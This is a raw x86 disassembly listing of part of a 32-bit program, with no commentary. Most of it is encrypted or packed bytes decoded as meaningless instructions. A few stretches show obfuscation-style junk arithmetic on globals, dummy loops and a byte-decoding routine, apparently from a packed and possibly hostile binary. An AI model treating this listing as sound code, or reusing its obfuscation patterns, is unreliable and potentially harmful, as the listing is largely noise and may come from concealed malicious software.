  403109:	(bad)  [ebx]
  40310b:	imul   edi,DWORD PTR [eax+edx*2-0x6a],0x3a078b46
  403113:	sbb    BYTE PTR [edi+0x6d],0x9b
  403117:	fisubr DWORD PTR ds:0x4aa90f21
  40311d:	inc    eax
  40311e:	add    cl,BYTE PTR [ebx-0x3549eac5]
  403124:	idiv   DWORD PTR [edi]
  403126:	add    DWORD PTR [ecx],ebx
  403128:	pop    es
  403129:	mov    ah,0x19
  40312b:	jne    0x69889b5
  403131:	push   edi
  403132:	inc    edi
  403133:	cwde   
  403134:	stos   BYTE PTR es:[edi],al
  403135:	or     eax,0xd9db8d87
  40313a:	dec    edx
  40313b:	iret   
  40313c:	in     al,dx
  40313d:	jl     0x4031aa
  40313f:	mov    DWORD PTR [eax-0x3],ebp
  403142:	jnp    0x403105
  403144:	xor    DWORD PTR [eax],ebp
  403146:	push   eax
  403147:	das    
  403148:	daa    
  403149:	xchg   DWORD PTR [esp+eax*1],ecx
  40314c:	add    eax,0x90dce513
  403151:	jmp    0x403197
  403153:	imul   edi,esi,0x5b
  403156:	mov    ebp,0xbe8edb97
  40315b:	mov    al,0x64
  40315d:	cmp    ebp,DWORD PTR [ebx]
  40315f:	pop    es
  403160:	lea    edi,[edi]
  403162:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403163:	jnp    0x403121
  403165:	iret   
  403166:	sbb    BYTE PTR gs:[eax-0x2b48d994],bh
  40316d:	mov    eax,ds:0x4b0b5c85
  403172:	or     DWORD PTR [edx],esp
  403174:	cmp    BYTE PTR [edx+0x1dc5e3dd],cl
  40317a:	cmp    BYTE PTR [esi],cl
  40317c:	push   esi
  40317d:	(bad)  
  40317e:	std    
  40317f:	xor    dh,ch
  403181:	es aaa 
  403183:	out    0xd8,eax
  403185:	push   ebx
  403186:	imul   ebp,DWORD PTR [ebx],0x15
  403189:	das    
  40318a:	retf   
  40318b:	shl    BYTE PTR [ecx+0x31],1
  40318e:	push   esp
  40318f:	jns    0x40317b
  403191:	xor    eax,0x2bfdc8c9
  403196:	ror    DWORD PTR [eax-0x67bc8],0x7d
  40319d:	or     esi,ebp
  40319f:	and    ah,BYTE PTR [ecx]
  4031a1:	in     eax,0x14
  4031a3:	call   0xd03e:0xaafe00f3
  4031aa:	xchg   esi,eax
  4031ab:	enter  0x49fb,0x5a
  4031af:	and    DWORD PTR [ebx+edi*8],esp
  4031b2:	int    0x9d
  4031b4:	shl    BYTE PTR [esi+0x120e9ff6],0x1d
  4031bb:	int3   
  4031bc:	ret    
  4031bd:	xchg   DWORD PTR [ecx],edi
  4031bf:	xchg   esp,eax
  4031c0:	adc    al,0xe2
  4031c2:	aaa    
  4031c3:	aaa    
  4031c4:	rcl    cl,1
  4031c6:	stc    
  4031c7:	aaa    
  4031c8:	aas    
  4031c9:	cmp    dh,BYTE PTR [esp+ecx*2-0x771ed2af]
  4031d0:	sub    DWORD PTR [eax+ebp*4+0x46e88694],edi
  4031d7:	and    al,BYTE PTR [edx+ecx*8]
  4031da:	pop    esi
  4031db:	int    0x2a
  4031dd:	mov    bh,0xee
  4031e0:	and    DWORD PTR [esi+0x32004bef],ebp
  4031e6:	push   edi
  4031e7:	push   ss
  4031e8:	xlat   BYTE PTR ds:[ebx]
  4031e9:	mov    eax,0x907acf72
  4031ee:	lods   al,BYTE PTR ds:[esi]
  4031ef:	test   DWORD PTR [ecx],esi
  4031f1:	xlat   BYTE PTR ds:[ebx]
  4031f3:	mov    ecx,0x50d378f8
  4031f8:	add    DWORD PTR [ebx-0x32f47c9f],ebp
  4031fe:	jb     0x40325f
  403200:	push   ebp
  403201:	push   es
  403202:	adc    cl,BYTE PTR [edi]
  403204:	jecxz  0x40326f
  403206:	retf   0x861a
  403209:	pop    ds
  40320a:	adc    al,0x50
  40320c:	int3   
  40320d:	push   esp
  40320e:	dec    esp
  40320f:	ins    BYTE PTR es:[edi],dx
  403210:	enter  0x604b,0x89
  403214:	jb     0x4031a9
  403216:	fwait
  403217:	push   cs
  403218:	jne    0x403246
  40321a:	mov    eax,ds:0x7f6a87a1
  40321f:	cmc    
  403220:	sbb    BYTE PTR [ecx+0x0],dh
  403223:	call   0x667e7e82
  403228:	(bad)  
  403229:	iret   
  40322a:	retf   0x19c3
  40322d:	or     DWORD PTR [edx],0x78
  403230:	ins    BYTE PTR es:[edi],dx
  403231:	dec    esp
  403232:	and    bl,BYTE PTR [ebp+0x79]
  403235:	xchg   edx,eax
  403236:	mov    al,ds:0x17ac37f
  40323b:	push   esi
  40323c:	outs   dx,DWORD PTR ds:[esi]
  40323d:	std    
  40323e:	mov    dl,0xc5
  403240:	add    DWORD PTR [eax+0x14497d5d],ebp
  403246:	les    ebp,FWORD PTR [eax+0x4d]
  403249:	bound  ebx,QWORD PTR [edi+0x74]
  40324c:	lahf   
  40324d:	nop
  40324e:	or     dh,BYTE PTR [ecx]
  403250:	je     0x40326a
  403252:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403253:	test   DWORD PTR [edi],esp
  403255:	push   0xffffffb5
  403257:	cmp    DWORD PTR [ecx+0x7d],0xfffffff5
  40325b:	fidiv  DWORD PTR ds:0xebe072d3
  403261:	push   0xebb4b803
  403266:	xchg   edx,eax
  403267:	js     0x40328f
  403269:	hlt    
  40326a:	push   esi
  40326b:	push   ebx
  40326c:	ror    DWORD PTR [ebp-0x6ac60863],cl
  403272:	and    BYTE PTR [ecx],ah
  403274:	pop    es
  403275:	(bad)  
  403276:	mov    eax,0x8a38
  40327b:	xor    ax,WORD PTR [ecx+0x20]
  40327f:	mov    ecx,0x3afe
  403284:	and    DWORD PTR ds:0x43467b,0x434643
  40328e:	add    ax,cx
  403291:	mov    ecx,DWORD PTR ds:0x43468f
  403297:	xor    ecx,DWORD PTR ds:0x4345eb
  40329d:	mov    DWORD PTR ds:0x43468f,ecx
  4032a3:	movzx  eax,ax
  4032a6:	mov    ecx,DWORD PTR ds:0x43467f
  4032ac:	xor    DWORD PTR ds:0x434603,ecx
  4032b2:	mov    DWORD PTR [ebp-0xc],eax
  4032b5:	mov    ecx,DWORD PTR ds:0x43468f
  4032bb:	sbb    ecx,DWORD PTR ds:0x4346bf
  4032c1:	mov    DWORD PTR ds:0x43468f,ecx
  4032c7:	mov    BYTE PTR [ebp-0x1],0x7f
  4032cb:	lea    eax,[ebp-0x1]
  4032ce:	or     DWORD PTR ds:0x43468f,0x2e6e
  4032d8:	mov    DWORD PTR [ebp-0x10],eax
  4032db:	and    DWORD PTR ds:0x43470b,edi
  4032e1:	jmp    0x4036d6
  4032e6:	jo     0x4032d7
  4032e8:	inc    edi
  4032e9:	xchg   DWORD PTR [ecx-0x49],eax
  4032ec:	jo     0x4032d7
  4032ee:	jne    0x403366
  4032f0:	xchg   edx,eax
  4032f1:	or     dl,cl
  4032f3:	cs cwde 
  4032f5:	or     BYTE PTR [ebx],0x10
  4032f8:	jle    0x403378
  4032fa:	push   esi
  4032fb:	jns    0x40337b
  4032fd:	jle    0x403294
  4032ff:	xchg   ecx,eax
  403300:	jecxz  0x4032ca
  403302:	push   eax
  403303:	gs pop ecx
  403305:	or     eax,0xacc71995
  40330a:	and    eax,0xaa614422
  40330f:	clc    
  403310:	shr    bh,0xdc
  403313:	xchg   edi,eax
  403314:	nop
  403315:	adc    BYTE PTR [ecx-0x23455785],0x4c
  40331c:	in     eax,dx
  40331d:	fmul   QWORD PTR [edi-0x33f2dd25]
  403323:	xlat   BYTE PTR ds:[ebx]
  403324:	fldcw  WORD PTR [edi+edx*1+0x55db4b43]
  40332b:	lea    ecx,[edi]
  40332d:	je     0x403329
  40332f:	inc    esi
  403330:	pop    es
  403331:	mov    ds:0xae5169c3,eax
  403336:	int    0xa1
  403338:	out    dx,eax
  403339:	aam    0xa4
  40333b:	test   BYTE PTR [esi],dl
  40333d:	dec    esp
  40333e:	and    eax,ebx
  403340:	sbb    eax,0x39cf344a
  403345:	or     eax,ecx
  403347:	retf   
  403348:	jecxz  0x40339d
  40334a:	inc    ebx
  40334b:	xor    BYTE PTR [ecx+0x1c],ah
  40334e:	fldcw  WORD PTR [esi]
  403350:	pop    esp
  403351:	gs pop edx
  403353:	jle    0x403335
  403355:	cmp    bh,BYTE PTR ds:0x399a8253
  40335b:	sbb    eax,0xbd28f029
  403360:	cwde   
  403361:	mov    esi,0xff7c10e
  403366:	shl    BYTE PTR [ebx],cl
  403368:	call   0x5892:0xd70325d4
  40336f:	ret    0xb09e
  403372:	loope  0x4033d3
  403374:	out    dx,al
  403375:	and    BYTE PTR [edi+edi*8],0x71
  403379:	and    BYTE PTR [eax],dl
  40337b:	sbb    ecx,DWORD PTR [ebx-0x6e]
  40337e:	retf   
  40337f:	mov    al,0x58
  403381:	pause  
  403383:	xor    BYTE PTR [esi],al
  403385:	aas    
  403386:	xchg   ecx,eax
  403387:	stc    
  403388:	das    
  403389:	test   al,0x3e
  40338b:	adc    esp,edi
  40338d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40338e:	sub    eax,0xe5e7e6ac
  403393:	pop    eax
  403394:	push   ebp
  403395:	ins    DWORD PTR es:[edi],dx
  403396:	aas    
  403397:	jle    0x40333d
  403399:	popa   
  40339a:	scas   eax,DWORD PTR es:[edi]
  40339b:	dec    eax
  40339c:	push   ebx
  40339d:	dec    eax
  40339e:	mov    ebp,0x3fcf3198
  4033a3:	mov    al,0x16
  4033a5:	jb     0x4033f7
  4033a7:	mov    eax,0x9d00c28a
  4033ac:	fld    DWORD PTR [ebp+0x3a]
  4033af:	mov    bl,0x82
  4033b1:	cli    
  4033b2:	lods   al,BYTE PTR ds:[esi]
  4033b3:	push   edi
  4033b4:	idiv   BYTE PTR [eax]
  4033b6:	add    esi,esi
  4033b8:	sbb    ecx,ecx
  4033ba:	and    edi,edx
  4033bc:	push   esi
  4033bd:	rol    DWORD PTR [esi+eiz*4+0x6523c86c],cl
  4033c4:	push   0x5576e10b
  4033c9:	dec    edi
  4033ca:	xor    ecx,DWORD PTR [ebx+0x42]
  4033cd:	xchg   edi,eax
  4033ce:	mov    dh,0x5a
  4033d0:	sbb    al,0x97
  4033d2:	inc    esp
  4033d3:	jmp    0x9fba:0x521d5963
  4033da:	neg    DWORD PTR ds:0xf1f944d5
  4033e0:	ret    
  4033e1:	push   ebx
  4033e2:	pop    esp
  4033e3:	fisttp DWORD PTR ds:0x9a9bfd45
  4033e9:	pushf  
  4033ea:	add    BYTE PTR [ebx-0x3b75bfee],0xf6
  4033f1:	outs   dx,BYTE PTR ds:[esi]
  4033f2:	pop    edi
  4033f3:	dec    ecx
  4033f4:	mov    ebx,DWORD PTR ds:0x663ceaea
  4033fa:	dec    edi
  4033fb:	push   ecx
  4033fc:	jge    0x40339d
  4033fe:	outs   dx,BYTE PTR ds:[esi]
  4033ff:	pop    ebp
  403400:	pop    eax
  403401:	in     al,dx
  403402:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403403:	add    eax,0xab649fe5
  403408:	(bad)  
  403409:	(bad)  
  40340b:	add    edx,DWORD PTR [edi]
  40340d:	sub    ecx,eax
  40340f:	fmul   DWORD PTR [eax-0x14badcb4]
  403415:	enter  0x82bf,0x3b
  403419:	and    ebx,ebx
  40341b:	sub    al,0xdb
  40341d:	push   esp
  40341e:	outs   dx,BYTE PTR ds:[esi]
  40341f:	test   BYTE PTR [ebp+esi*8-0x1f],dl
  403423:	outs   dx,DWORD PTR ds:[esi]
  403424:	aad    0x71
  403426:	sbb    bh,BYTE PTR [ecx-0x62351229]
  40342c:	loopne 0x403465
  40342e:	ja     0x4033ea
  403430:	inc    esp
  403431:	pop    edi
  403432:	fcmove st,st(7)
  403434:	addr16 cmc 
  403436:	repz jmp FWORD PTR [esi]
  403439:	push   0xfa029f03
  40343e:	jb     0x4033d6
  403440:	mov    dh,0xd4
  403442:	mov    fs,WORD PTR [ecx+edx*8]
  403445:	rcl    BYTE PTR [esi+0x9f7c375],0x39
  40344c:	adc    edi,edi
  40344e:	das    
  40344f:	mov    ebp,0x1761e4c0
  403454:	mov    edi,edi
  403456:	xor    al,0x2a
  403458:	pop    esp
  403459:	sbb    ebx,DWORD PTR ds:0xe4284a68
  40345f:	fsubr  QWORD PTR [ebx]
  403461:	adc    DWORD PTR [ebx],0x6d
  403464:	lea    ecx,[ebp-0x657f17da]
  40346a:	push   ss
  40346b:	sbb    BYTE PTR [ebx-0x5f],0x95
  40346f:	iret   
  403470:	sbb    DWORD PTR fs:[edi+edi*2-0x1ea0de8],0x5cf08904
  40347c:	test   eax,0xcffc70dc
  403481:	hlt    
  403482:	sbb    DWORD PTR [edi],edx
  403484:	and    al,BYTE PTR [ebx+0x6e]
  403487:	jmp    0xbc8c1447
  40348c:	jno    0x4034b3
  40348e:	push   ss
  40348f:	shl    eax,cl
  403491:	mov    eax,ds:0x49ea4a5c
  403496:	push   ebp
  403497:	ins    BYTE PTR es:[edi],dx
  403498:	inc    edx
  403499:	shl    DWORD PTR [edi+eax*1-0xd],1
  40349d:	jno    0x4034d9
  40349f:	stos   DWORD PTR es:[edi],eax
  4034a0:	adc    eax,DWORD PTR [eax-0x77a853a1]
  4034a6:	daa    
  4034a7:	sub    BYTE PTR [ebp+0x25628179],dl
  4034ad:	jno    0x403489
  4034af:	fs pop ds
  4034b1:	cs mov al,0x56
  4034b4:	imul   BYTE PTR [edi+eax*1+0x36d08e8e]
  4034bb:	int    0x54
  4034bd:	mov    ch,0x8e
  4034bf:	jmp    0x90f2:0x588785fe
  4034c6:	enter  0x4a0f,0x8e
  4034ca:	mov    ah,BYTE PTR [edi+ebx*2+0x584350a1]
  4034d1:	push   0xffffff87
  4034d3:	arpl   WORD PTR [eax-0x2c],sp
  4034d6:	retf   0x2697
  4034d9:	and    eax,0x6d225e85
  4034de:	pop    es
  4034df:	jp     0x4034db
  4034e1:	inc    edx
  4034e2:	enter  0xd7cd,0x6c
  4034e6:	push   ebp
  4034e7:	into   
  4034e8:	sbb    ah,al
  4034ea:	ror    esi,cl
  4034ec:	mov    esp,0x60a99d2d
  4034f1:	mov    WORD PTR [esi-0x33c50ab7],es
  4034f7:	mov    bl,0x9c
  4034f9:	lds    esi,FWORD PTR [eax]
  4034fb:	jb     0x4034b8
  4034fd:	adc    BYTE PTR [edi],0xfc
  403500:	in     al,dx
  403501:	mov    gs,WORD PTR [ecx-0x7]
  403504:	dec    esi
  403505:	out    0x74,al
  403507:	push   ecx
  403508:	mov    ebx,0x7020f9da
  40350d:	lods   al,BYTE PTR ds:[esi]
  40350e:	jle    0x403539
  403510:	in     al,dx
  403511:	dec    eax
  403512:	adc    al,0x4e
  403514:	and    ch,BYTE PTR [eax+eax*2]
  403517:	pop    esp
  403518:	pusha  
  403519:	aaa    
  40351a:	mov    ch,0xb1
  40351c:	out    0x80,eax
  40351e:	inc    ebp
  40351f:	push   ebx
  403520:	mov    cs,WORD PTR [ebp+0x66c79b35]
  403526:	dec    ecx
  403527:	mov    ch,0x96
  403529:	adc    al,0x4
  40352b:	inc    esp
  40352c:	sub    BYTE PTR [edi-0x542192ec],cl
  403532:	cmp    ebx,0x49
  403535:	(bad)  
  403536:	jb     0x4035a8
  403538:	inc    edx
  403539:	rcr    BYTE PTR [esi-0x71],cl
  40353c:	xchg   esp,eax
  40353d:	xor    dh,dl
  40353f:	pop    esp
  403540:	loop   0x403584
  403542:	adc    BYTE PTR [eax+0x54b4895f],cl
  403548:	xchg   DWORD PTR [edx-0x6a],ecx
  40354b:	and    ebx,eax
  40354d:	out    0x5f,al
  40354f:	retf   0xa899
  403552:	mov    esp,0x8a222178
  403557:	jo     0x403515
  403559:	mov    al,ch
  40355b:	pusha  
  40355c:	inc    eax
  40355d:	mov    WORD PTR [eax-0x49247cd0],fs
  403563:	adc    BYTE PTR [esi+0xa],ah
  403566:	stc    
  403567:	mov    ds:0x1576aaf,al
  40356c:	in     al,dx
  40356d:	data16 and al,0xb5
  403570:	push   0x1cc229b3
  403575:	xchg   ebx,eax
  403576:	popf   
  403577:	out    dx,al
  403578:	(bad)  
  40357a:	mov    edx,0x2c12b71d
  40357f:	pop    edx
  403580:	mov    dl,0x1c
  403582:	sti    
  403583:	mov    WORD PTR [edi-0x14615fe6],es
  403589:	dec    esp
  40358a:	test   DWORD PTR ds:0xc589531,edi
  403590:	jmp    0x8e66:0x27b290bf
  403597:	mov    esp,0x793b107a
  40359c:	add    eax,0x308571fe
  4035a1:	ror    eax,0x35
  4035a4:	in     al,dx
  4035a5:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4035a7:	xor    DWORD PTR [ebx-0x42],ebp
  4035aa:	mov    al,ds:0xf6c9ae0d
  4035af:	jge    0x4035e6
  4035b1:	mov    esp,0x338d724c
  4035b6:	into   
  4035b7:	mov    edx,0xfa12163
  4035bc:	mov    ah,0x51
  4035be:	add    al,0xd0
  4035c0:	ins    DWORD PTR es:[edi],dx
  4035c1:	sub    ch,BYTE PTR [ecx]
  4035c3:	pop    ebp
  4035c4:	shr    DWORD PTR [edi+0x5c82a895],0x63
  4035cb:	sysenter 
  4035cd:	add    eax,0xcebc4d41
  4035d2:	add    eax,DWORD PTR [ebx+0x56]
  4035d5:	into   
  4035d6:	cmp    bh,cl
  4035d8:	cmp    edx,DWORD PTR ds:0x77435f00
  4035de:	fucomi st,st(2)
  4035e0:	cdq    
  4035e1:	scas   eax,DWORD PTR es:[edi]
  4035e2:	or     eax,0x80e23bd3
  4035e7:	(bad)  
  4035e8:	push   0x1d
  4035ea:	inc    eax
  4035eb:	xchg   esp,eax
  4035ec:	retf   
  4035ed:	and    dl,dh
  4035ef:	or     ebx,DWORD PTR [edx-0x2cf0dbf7]
  4035f5:	imul   BYTE PTR [edi+0x1ce7df05]
  4035fb:	sub    DWORD PTR [ebp+0x7a95b29e],ebp
  403601:	scas   eax,DWORD PTR es:[edi]
  403602:	sbb    al,0x66
  403604:	mov    eax,ds:0xed4f2196
  403609:	test   DWORD PTR [esi-0x23],0x444c40cd
  403610:	rol    ah,1
  403612:	pop    esp
  403613:	fbld   TBYTE PTR [edx]
  403615:	mov    ebp,0x5ea4a451
  40361b:	mov    edi,DWORD PTR [ecx]
  40361d:	pusha  
  40361e:	stc    
  40361f:	fcmove st,st(4)
  403621:	mov    ecx,eax
  403623:	xchg   ebp,eax
  403624:	rcl    DWORD PTR [ebx],cl
  403626:	jo     0x403614
  403628:	icebp  
  403629:	adc    DWORD PTR [ebx-0x3746a8c2],0xa3808d06
  403633:	ss fs or bh,cl
  403637:	arpl   di,di
  403639:	test   eax,0x4de6b617
  40363e:	lahf   
  40363f:	icebp  
  403640:	and    al,0x78
  403642:	sbb    bh,dh
  403644:	pusha  
  403645:	mov    ch,0x58
  403647:	inc    edx
  403648:	or     al,0xc3
  40364a:	fisub  DWORD PTR [edi+0x6a0a8027]
  403650:	adc    ebp,DWORD PTR [ecx]
  403652:	ins    BYTE PTR es:[edi],dx
  403653:	mov    edi,0x99a9ac23
  403658:	push   ecx
  403659:	call   0x1263eaea
  40365e:	jno    0x403642
  403660:	loop   0x4036da
  403662:	out    dx,eax
  403663:	int3   
  403664:	dec    ebp
  403665:	pushf  
  403666:	push   esp
  403667:	xchg   esi,eax
  403668:	sbb    DWORD PTR [eax+ecx*2+0x4a508073],esi
  40366f:	int    0x6c
  403671:	jae    0x520797d1
  403677:	xlat   BYTE PTR ds:[ebx]
  403678:	mov    edi,0xd9664d15
  40367d:	jg     0x40364a
  40367f:	xchg   ebp,eax
  403680:	pushf  
  403681:	push   edi
  403682:	lods   eax,DWORD PTR cs:[esi]
  403684:	inc    edi
  403685:	pop    ecx
  403686:	data16 mov ah,BYTE PTR [edi]
  403689:	(bad)  
  40368a:	dec    ebx
  40368b:	mov    ch,0x7a
  40368d:	(bad)  
  40368e:	sub    eax,0x309810fe
  403693:	mov    esp,0xf46a04e7
  403698:	imul   esi,DWORD PTR [ecx-0x8],0x260e04a8
  40369f:	mov    bl,0xc1
  4036a1:	and    al,0x53
  4036a3:	repz leave 
  4036a5:	retf   
  4036a6:	push   esi
  4036a7:	and    ah,bh
  4036a9:	cmp    edx,DWORD PTR [esi+0x3a]
  4036ac:	ret    
  4036ad:	dec    edx
  4036ae:	sti    
  4036af:	js     0x4036c1
  4036b1:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036b3:	outs   dx,BYTE PTR ds:[esi]
  4036b4:	pop    ebx
  4036b5:	iret   
  4036b6:	jmp    0x8e8e:0x7b0214a
  4036bd:	sub    DWORD PTR [ebx],0x7c
  4036c0:	cmp    ecx,DWORD PTR [ebp+eiz*1-0x71]
  4036c4:	das    
  4036c5:	and    ebx,DWORD PTR [esi]
  4036c7:	inc    edx
  4036c8:	pop    ecx
  4036c9:	mov    BYTE PTR [ebp-0x4d98f3e2],dl
  4036cf:	jo     0x4036a0
  4036d1:	cld    
  4036d2:	in     al,0xf5
  4036d4:	js     0x403730
  4036d6:	mov    al,BYTE PTR [ebp-0x1]
  4036d9:	mov    ecx,DWORD PTR ds:0x4345eb
  4036df:	sbb    ecx,DWORD PTR ds:0x434707
  4036e5:	mov    DWORD PTR ds:0x4345eb,ecx
  4036eb:	mov    ecx,DWORD PTR [ebp-0x10]
  4036ee:	sbb    DWORD PTR ds:0x434713,0x563b
  4036f8:	xor    al,0x44
  4036fa:	add    DWORD PTR ds:0x4345fb,0xe00
  403704:	sub    al,0x3a
  403706:	or     DWORD PTR ds:0x4345f7,0x434707
  403710:	mov    BYTE PTR [ecx],al
  403712:	xor    DWORD PTR ds:0x434677,ecx
  403718:	mov    DWORD PTR [ebp-0x8],0xf89c8536
  40371f:	and    DWORD PTR ds:0x434687,0x0
  403729:	jmp    0x40373d
  40372e:	xor    ecx,ecx
  403730:	xor    ecx,DWORD PTR ds:0x434687
  403736:	inc    ecx
  403737:	mov    DWORD PTR ds:0x434687,ecx
  40373d:	cmp    DWORD PTR ds:0x434687,0x18
  403744:	jae    0x40382f
  40374a:	cmp    DWORD PTR ds:0x434687,0x20
  403751:	jne    0x40376a
  403757:	push   0x446b
  40375c:	push   DWORD PTR [ebp-0xc]
  40375f:	push   0x8d79
  403764:	call   DWORD PTR ds:0x413278
  40376a:	jmp    0x40372e
  40376f:	mov    DWORD PTR ds:0x4346cb,0x14
  403779:	cmp    DWORD PTR ds:0x4346cb,0x0
  403780:	je     0x40382f
  403786:	cmp    DWORD PTR ds:0x4346cb,0xa
  40378d:	jne    0x4037a6
  403793:	push   0x695b
  403798:	push   0x23be
  40379d:	push   DWORD PTR [ebp-0x18]
  4037a0:	call   DWORD PTR ds:0x41327c
  4037a6:	cmp    DWORD PTR ds:0x4346cb,0xb
  4037ad:	jne    0x4037c0
  4037b3:	mov    ecx,DWORD PTR ds:0x4346cb
  4037b9:	dec    ecx
  4037ba:	mov    DWORD PTR ds:0x4346cb,ecx
  4037c0:	mov    ecx,DWORD PTR ds:0x4346cb
  4037c6:	dec    ecx
  4037c7:	mov    DWORD PTR ds:0x4346cb,ecx
  4037cd:	jmp    0x403779
  4037d2:	mov    DWORD PTR ds:0x4345e7,0x1c
  4037dc:	cmp    DWORD PTR ds:0x4345e7,0x0
  4037e3:	je     0x40382f
  4037e9:	cmp    DWORD PTR ds:0x4345e7,0xc
  4037f0:	jne    0x403801
  4037f6:	push   0x434849
  4037fb:	call   DWORD PTR ds:0x413334
  403801:	cmp    DWORD PTR ds:0x4345e7,0xd
  403808:	jne    0x40381b
  40380e:	mov    ecx,DWORD PTR ds:0x4345e7
  403814:	dec    ecx
  403815:	mov    DWORD PTR ds:0x4345e7,ecx
  40381b:	mov    ecx,DWORD PTR ds:0x4345e7
  403821:	dec    ecx
  403822:	mov    DWORD PTR ds:0x4345e7,ecx
  403828:	jmp    0x4037dc
  40382d:	xor    ecx,ecx
  40382f:	mov    DWORD PTR [ebp-0x10],0xf89c8539
  403836:	adc    eax,eax
  403838:	mov    eax,DWORD PTR [ebp-0x8]
  40383b:	mov    ecx,0x7510851
  403840:	push   esi
  403841:	adc    DWORD PTR ds:0x434687,edi
  403847:	xor    eax,ecx
  403849:	inc    DWORD PTR ds:0x43470b
  40384f:	mov    esi,0x327299
  403854:	sub    DWORD PTR ds:0x43464f,0x3953
  40385e:	add    eax,esi
  403860:	jmp    0x40387d
  403865:	not    DWORD PTR ds:0x434643
  40386b:	mov    dl,BYTE PTR [ebp-0x1]
  40386e:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403872:	mov    DWORD PTR ds:0x43464b,0x4a72
  40387c:	inc    eax
  40387d:	cmp    eax,0x40
  403880:	jb     0x403865
  403886:	mov    edx,DWORD PTR [ebp-0x8]
  403889:	mov    eax,DWORD PTR [ebp-0xc]
  40388c:	xor    edx,ecx
  40388e:	add    edx,esi
  403890:	cmp    edx,eax
  403892:	je     0x403ccd
  403898:	push   ebx
  403899:	push   edi
  40389a:	mov    edi,DWORD PTR [ebp+0x8]
  40389d:	mov    eax,0x8a38
  4038a2:	xor    ax,WORD PTR [edi+edx*4+0x2]
  4038a7:	mov    edi,0x3afe
  4038ac:	jmp    0x403ca1
  4038b1:	sbb    DWORD PTR [edx+0x31],0x6d5dfd54
  4038b8:	jae    0x4038d9
  4038ba:	(bad)  
  4038bb:	out    dx,al
  4038bc:	xchg   esi,eax
  4038bd:	cld    
  4038be:	stos   DWORD PTR es:[edi],eax
  4038bf:	xlat   BYTE PTR ds:[ebx]
  4038c0:	int3   
  4038c1:	arpl   WORD PTR [ebx],dx
  4038c3:	jle    0x403943
  4038c5:	push   esi
  4038c6:	jns    0x403946
  4038c8:	jle    0x4038de
  4038ca:	aas    
  4038cb:	out    0x4b,eax
  4038cd:	mov    ebx,0xc26428a4
  4038d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038d3:	ins    BYTE PTR es:[edi],dx
  4038d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4038d5:	mov    edx,0x643b5f7d
  4038da:	pop    eax
  4038db:	and    eax,0x72c6bb28
  4038e0:	pop    edx
  4038e1:	lods   al,BYTE PTR ds:[esi]
  4038e2:	das    
  4038e3:	call   0xcb1e:0x3a777fc6
  4038ea:	xchg   ecx,eax
  4038eb:	xor    ecx,DWORD PTR [esi-0x7b4923cd]
  4038f1:	lds    edi,FWORD PTR [edi+eiz*4]
  4038f4:	ss pop eax
  4038f6:	jge    0x4038da
  4038f8:	pop    ds
  4038f9:	sti    
  4038fa:	(bad)  [edi-0x9]
  4038fd:	pop    eax
  4038fe:	(bad)  [edi]
  403900:	fdiv   QWORD PTR [esi+0xc]
  403903:	jne    0x403911
  403905:	fistp  WORD PTR [edx+0x7e5c4cf]
  40390b:	in     al,0x96
  40390d:	xor    al,0x91
  40390f:	pop    edi
  403910:	add    eax,0xe7b10964
  403915:	cli    
  403916:	xchg   edx,eax
  403917:	push   esi
  403918:	sub    esi,DWORD PTR [ecx]
  40391a:	je     0x40399b
  40391c:	mov    edi,DWORD PTR [eax-0x549d3520]
  403922:	push   0x8cc4fad7
  403927:	int    0xb8
  403929:	jbe    0x403976
  40392b:	popa   
  40392c:	jp     0x4038d9
  40392e:	cmp    DWORD PTR ds:[ebx-0x14ae0f31],esp
  403935:	add    ch,0x67
  403938:	push   cs
  403939:	xchg   edx,eax
  40393a:	idiv   DWORD PTR [esi]
  40393c:	out    0x5d,al
  40393e:	cmp    al,0x59
  403940:	dec    eax
  403941:	adc    esp,DWORD PTR [esi+0x34395ae]
  403947:	cmp    eax,0xb886e5d8
  40394c:	xchg   edx,eax
  40394d:	add    BYTE PTR [eax+0x3f],0x38
  403951:	cs push ebp
  403953:	nop
  403954:	dec    edx
  403955:	outs   dx,DWORD PTR ds:[esi]
  403956:	ds aaa 
  403958:	jecxz  0x403997
  40395a:	in     al,dx
  40395b:	jo     0x4039d3
  40395d:	push   ebp
  40395e:	into   
  40395f:	or     ah,BYTE PTR [edi]
  403961:	or     BYTE PTR [esi],al
  403963:	jmp    0xaec8:0x2e112daa
  40396a:	adc    al,0xeb
  40396c:	push   eax
  40396d:	ss sub BYTE PTR ss:[edi],cl
  403971:	call   0x3652:0xb5d0ac75
  403978:	shr    DWORD PTR [eax+0x74435d3e],1
  40397e:	pop    esi
  40397f:	lahf   
  403980:	sar    DWORD PTR [edx+0x33f3e95a],1
  403986:	sub    al,0x9d
  403988:	fwait
  403989:	inc    esp
  40398a:	mov    bh,0x5e
  40398c:	push   es
  40398d:	scas   al,BYTE PTR es:[edi]
  40398e:	cli    
  40398f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403990:	fs lock sti 
  403993:	jp     0x403975
  403995:	aaa    
  403996:	mov    bh,0xd6
  403998:	adc    esi,DWORD PTR [ebx-0x5c60ec9f]
  40399e:	imul   ebx,DWORD PTR [eax],0x61
  4039a1:	fisub  DWORD PTR [ebx]
  4039a3:	leave  
  4039a4:	sbb    al,0xd1
  4039a6:	xchg   ecx,eax
  4039a7:	mov    ds:0x91158ff3,eax
  4039ac:	idiv   DWORD PTR [eax-0x3f]
  4039af:	mov    DWORD PTR [edi+0xc],eax
  4039b2:	ins    BYTE PTR es:[edi],dx
  4039b3:	add    al,0x68
  4039b5:	xchg   esp,eax
  4039b6:	adc    al,0x24
  4039b8:	or     edx,esp
  4039ba:	mov    ch,0x1d
  4039bc:	mov    edx,0x40afcda9
  4039c1:	cmc    
  4039c2:	pop    esi
  4039c3:	cmp    BYTE PTR [eax-0x3f],bl
  4039c6:	scas   al,BYTE PTR es:[edi]
  4039c7:	adc    dl,bh
  4039c9:	pop    ds
  4039ca:	mov    BYTE PTR [edi],dl
  4039cc:	jg     0x403a0a
  4039ce:	retf   0xbd2c
  4039d1:	lds    edx,FWORD PTR [ebx-0x21e3778f]
